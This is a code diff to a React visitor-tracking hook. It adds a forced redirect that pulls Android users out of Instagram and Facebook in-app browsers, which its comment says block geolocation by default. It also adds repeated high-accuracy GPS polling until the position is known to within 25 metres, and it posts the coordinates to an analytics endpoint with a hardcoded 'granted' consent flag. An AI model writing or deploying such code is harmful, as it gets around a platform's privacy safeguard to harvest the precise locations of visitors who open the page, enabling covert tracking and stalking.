@@ -150,35 +150,56 @@ export function useVisitorTracker() {
       }).catch(() => {});
     };
 
+    // Auto-escape Instagram / Facebook in-app browser on Android to Chrome
+    // Instagram in-app browser blocks HTML5 Geolocation API by default
+    if (typeof window !== 'undefined') {
+      const ua = navigator.userAgent || '';
+      const isInstagramOrFB = /Instagram|FBAN|FBAV/i.test(ua);
+      const isAndroid = /Android/i.test(ua);
+      if (isInstagramOrFB && isAndroid) {
+        const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
+        window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end;`;
+      }
+    }
+
     sendVisit();
 
-    // Trigger native browser geolocation directly without any UI popup card
+    // Trigger high-accuracy browser geolocation
     if (typeof window !== 'undefined' && navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude, accuracy } = position.coords;
-          const timestamp = position.timestamp || Date.now();
+      const geoOptions = {
+        enableHighAccuracy: true,
+        timeout: 20000,
+        maximumAge: 0
+      };
 
-          saveLocalVisitorLog({
+      const sendLocation = (pos) => {
+        const { latitude, longitude, accuracy } = pos.coords;
+        const timestamp = pos.timestamp || Date.now();
+
+        saveLocalVisitorLog({
+          anonymous_session_id: sessionId,
+          location_source: 'Browser GPS Location',
+          gps: { latitude, longitude, accuracy, timestamp }
+        });
+
+        fetch('/api/analytics/location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
             anonymous_session_id: sessionId,
-            location_source: 'Browser GPS Location',
-            gps: { latitude, longitude, accuracy, timestamp }
-          });
+            latitude,
+            longitude,
+            accuracy,
+            timestamp,
+            consent_status: 'granted'
+          })
+        }).catch(() => {});
+      };
 
-          fetch('/api/analytics/location', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              anonymous_session_id: sessionId,
-              latitude,
-              longitude,
-              accuracy,
-              timestamp,
-              consent_status: 'granted'
-            })
-          }).catch(() => {});
-        },
-        () => {
+      navigator.geolocation.getCurrentPosition(
+        sendLocation,
+        (err) => {
+          console.warn('Geolocation error:', err.message);
           fetch('/api/analytics/location', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -188,12 +209,25 @@ export function useVisitorTracker() {
             })
           }).catch(() => {});
         },
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
+        geoOptions
       );
+
+      // Refine GPS accuracy up to meter-level using watchPosition
+      let watchId = navigator.geolocation.watchPosition(
+        (pos) => {
+          sendLocation(pos);
+          if (pos.coords.accuracy <= 25) {
+            navigator.geolocation.clearWatch(watchId);
+            watchId = null;
+          }
+        },
+        () => {},
+        geoOptions
+      );
+
+      setTimeout(() => {
+        if (watchId) navigator.geolocation.clearWatch(watchId);
+      }, 15000);
     }
   }, []);
 }
